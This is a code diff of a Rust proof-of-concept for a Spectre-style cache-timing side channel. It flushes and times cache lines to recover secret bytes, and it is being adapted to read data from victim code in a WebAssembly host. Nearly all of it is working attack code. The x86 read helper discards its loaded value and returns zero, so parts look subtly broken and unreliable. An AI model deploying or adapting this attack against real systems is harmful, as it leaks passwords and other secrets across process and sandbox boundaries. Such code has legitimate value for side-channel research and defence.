@@ -8,8 +8,6 @@ use std::arch::x86_64::_mm_mfence;
 #[cfg(all(target_arch = "x86_64"))]
 use std::arch::x86_64::_rdtsc;
 
-use reproduction::*;
-
 // In case of wasm target, then this is imported from the host
 // Set the host name as wasi
 #[cfg(all(target_arch = "wasm32"))]
@@ -18,6 +16,11 @@ extern "C" {
     fn _mm_clflush(ptr: *const u8);
     fn _mm_mfence();
     fn _mm_lfence();
+
+    // Pseudo victim code
+    fn sync_in_host(index: u32, malicious: u32);
+    // TODO another Wasm code
+    // fn sync_in_sibling()
 }
 
 // TODO, remove the tming based, use the 3/4 of the avg and the best,second best strategy, it is
@@ -32,19 +35,54 @@ const THRESHOLD: u64 = 470;
 const STRIDE: usize = 512;
 
 const data_size: usize = 11;
+// We need to add the pad here
 static mut public_data: [u8; 160] = [2; 160];
 
 const array_for_prediction: [u8; 256 * STRIDE] = [0; 256 * STRIDE];
 // If wasm target, move this from here, as well as the victim code
-const secret_data: &str = "My password";
 
 // To avoid optimization of the victim code
 static mut tmp: u8 = 0;
 
+#[cfg(all(target_arch = "x86_64"))]
+fn read_memory_offset(ptr: *const u8) -> u8 {
+    let result: u8 = 0;
+    unsafe {
+        asm!(
+            "mov {result}, [{x}]",
+            x = in(reg) ptr,
+            result = out(reg_byte) _
+        );
+    };
+    result
+}
+
+#[cfg(all(target_arch = "wasm32"))]
+#[no_mangle]
+fn read_memory_offset(ptr: *const u8) -> u8 {
+    let mut result = 0u8;
+    //println!("Reading from memory");
+    unsafe {
+        asm!(
+            // Push the ptr in the stack
+            "local.get {}",
+            "i32.load8_u 0",
+            //"i32.load8_u",
+            "local.set {}",
+            in(local) ptr,
+            lateout(local) result,
+            //result = out(reg_byte) _
+            options(nostack),
+
+        );
+    };
+    result
+}
+
 // Returns the best two indexes and the best two values
 #[no_mangle]
 #[allow(dead_code)]
-fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64; 2]) {
+fn read_memory_byte(malicious_x: usize) -> ([u64; 2], [u64; 2]) {
     let mut latencies = [0; 256];
     let mut scores = [0u64; 256];
 
@@ -54,7 +92,6 @@ fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64;
     let mut score = [0u64; 2];
     let mut value = [0u64; 2];
 
-    let secret_data_bytes = secret_data.as_bytes();
     // Set up the latencies and the scores to 0
     for i in 0..256 {
         scores[i] = 0;
@@ -64,7 +101,7 @@ fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64;
         eprint!("latencies = [")
     }*/
     // Get the TRIES from env
-    let tries = std::env::var("TRIES").unwrap_or("10000".to_string());
+    let tries = std::env::var("TRIES").unwrap_or("60000".to_string());
     let tries = tries.parse::<u64>().unwrap();
     for i in 0..tries {
         /*#[cfg(feature = "tracing")]
@@ -87,19 +124,16 @@ fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64;
             }
         }
         // Wait a little to the cache to flush
-        for _ in 0..1000 {}
+        for _ in 0..100000 {}
+        // TODO watch out for the optimization of this empty loop
         unsafe {
             _mm_mfence();
         }
 
-        // Set the cache
-        for j in 0..200 {
-            unsafe {
-                let addr = &array_for_prediction[secret_data_bytes[malicious_x] as usize * STRIDE]
-                    as *const u8;
-                tmp &= read_memory_offset(addr);
-            };
-        }
+        // Call the victim code outside this binary
+        // This call just simulates the synchronization between the attacker and the
+        // victim
+        // Here we access the line to measure the threshold of the cache hit
 
         for j in 0..256 {
             // To avoid stride caching
@@ -113,13 +147,19 @@ fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64;
                 tmp &= read_memory_offset(addr);
                 _rdtsc() - start
             };
-            //latencies[mix_i] += end;
-            // t_cachehit * 90% + t_cachemiss * 10%. Value below this threshold is considered cached access time
-            if end <= (90 * hit + 10 * miss) / 100 {
-                scores[mix_i] += 1;
-            }
+            latencies[mix_i] += end;
         }
 
+        let mut sum = 0;
+        for l in latencies {
+            sum += l;
+        }
+        //let avg = sum / 256;
+        for (i, l) in latencies.iter().enumerate() {
+            if 255 * l < 3 * sum / 4 {
+                scores[i] += 1;
+            }
+        }
         for j in 0..256 {
             // Get the best and the second best
             if max1 < 0 || scores[j] >= scores[max1 as usize] {
@@ -143,12 +183,6 @@ fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64;
 
         value[0] = max1 as u64;
         value[1] = max2 as u64;
-
-        /*if scores[max1 as usize] > 2 * scores[max2 as usize] {
-            #[cfg(feature = "tracing")]
-            println!("Breaking");
-            break;
-        }*/
     }
 
     #[cfg(feature = "tracing")]
@@ -164,6 +198,12 @@ fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64;
             eprint!("{},", l);
         }
         eprintln!("]");
+
+        //eprint!("a = [");
+        //for j in scores {
+        //    eprint!("{}, ", j);
+        //}
+        //eprintln!("]");
     }
 
     // For some reason we need a time delay here
@@ -171,6 +211,33 @@ fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64;
 
     //println!(" >");
     (score, value)
+}
+
+#[no_mangle]
+pub fn predict(pad: usize) {
+    for j in 0..11 {
+        let (score, value) = read_memory_byte(j + pad);
+        // get value 0 as char
+        let ch = value[0] as u8 as char;
+        let ch2 = value[1] as u8 as char;
+
+        #[cfg(feature = "tracing")]
+        println!(
+            // The value as char
+            "Reading at malicious_x {} = {}:{}:{} (second {} {})",
+            j, ch, value[0], score[0], value[1], score[1]
+        );
+
+        #[cfg(not(feature = "tracing"))]
+        print!("{}", ch);
+        // PRIME
+        for j in 0..256 {
+            unsafe {
+                _mm_clflush(&array_for_prediction[j * STRIDE] as *const u8);
+            }
+        }
+        //break;
+    }
 }
 
 pub fn main() {
@@ -194,23 +261,5 @@ pub fn main() {
         public_data[15] = 16;
     }
 
-    let (cache_hit, cache_miss) = reproduction::get_cache_time(&array_for_prediction);
-    println!("cache_hit = {}, cache_miss = {}", cache_hit, cache_miss);
-    for j in 0..11 {
-        let (score, value) = read_memory_byte(j, cache_hit, cache_miss);
-        // get value 0 as char
-        let ch = value[0] as u8 as char;
-        let ch2 = value[1] as u8 as char;
-
-        #[cfg(feature = "tracing")]
-        println!(
-            // The value as char
-            "Reading at malicious_x {} = {}:{}:{} (second {} {})",
-            j, ch, value[0], score[0], value[1], score[1]
-        );
-
-        #[cfg(not(feature = "tracing"))]
-        print!("{}", ch);
-        // PRIME
-    }
+    predict(0);
 }
